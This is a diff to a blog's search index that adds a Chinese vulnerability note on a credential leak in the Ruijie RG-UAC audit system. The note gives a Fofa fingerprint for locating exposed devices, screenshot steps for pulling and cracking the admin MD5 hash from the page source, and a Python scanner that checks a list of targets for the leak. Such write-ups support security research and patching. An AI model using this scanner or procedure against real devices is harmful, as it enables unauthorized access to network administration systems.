@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞</title>
+      <link href="/2021/03/6c05e651.html"/>
+      <url>/2021/03/6c05e651.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞"><a href="#锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞" class="headerlink" title="锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞"></a>锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞</h2><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p><strong>锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露,可以间接获取用户账号密码信息登录后台</strong></p><p><strong>编号：CNVD-2021-14536</strong></p><h1 id="Fofa指纹"><a href="#Fofa指纹" class="headerlink" title="Fofa指纹"></a>Fofa指纹</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title&#x3D;&quot;RG-UAC登录页面&quot; &amp;&amp; body&#x3D;&quot;admin&quot;</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308161840.png" alt="image-20210308161840038"></p><p><strong>源代码搜索：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308161935.png" alt="image-20210308161935213"></p><p><strong>MD5解密：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308162005.png" alt="image-20210308162005706"></p><p><strong>登录成功</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210308162316.png" alt="image-20210308162316216"></p><h1 id="自动化-POC"><a href="#自动化-POC" class="headerlink" title="自动化 POC"></a>自动化 POC</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">title</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+  \033[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统                             \033[0m&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POC_1</span>(<span class="params">target_url</span>):</span></span><br><span class="line">    vuln_url = target_url</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;super_admin&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> <span class="string">&quot;password&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[32m[o] 目标 &#123;&#125;存在漏洞 ,F12查看源码获取密码md5值 \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Scan</span>(<span class="params">file_name</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>) <span class="keyword">as</span> scan_url:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> scan_url:</span><br><span class="line">            <span class="keyword">if</span> url[:<span class="number">4</span>] != <span class="string">&quot;http&quot;</span>:</span><br><span class="line">                url = <span class="string">&quot;http://&quot;</span> + url</span><br><span class="line">            url = url.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                POC_1(url)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">&quot;\033[31m[x] 请求报错 \033[0m&quot;</span>.<span class="built_in">format</span>(e))</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    title()</span><br><span class="line">    file_name  = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    Scan(file_name)</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Note </category>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Vulnerability </tag>
+            
+            <tag> Fofa </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CentOS 8 配置记录</title>
       <link href="/2021/02/bc3116a4.html"/>
       <url>/2021/02/bc3116a4.html</url>
@@ -89,6 +118,8 @@
             <tag> Vulnerability </tag>
             
             <tag> Github </tag>
+            
+            <tag> Fofa </tag>
             
         </tags>
       
@@ -448,11 +479,11 @@
       
         <tags>
             
+            <tag> Mac </tag>
+            
             <tag> Hexo </tag>
             
             <tag> CDN </tag>
-            
-            <tag> Mac </tag>
             
             <tag> Butterfly </tag>
             
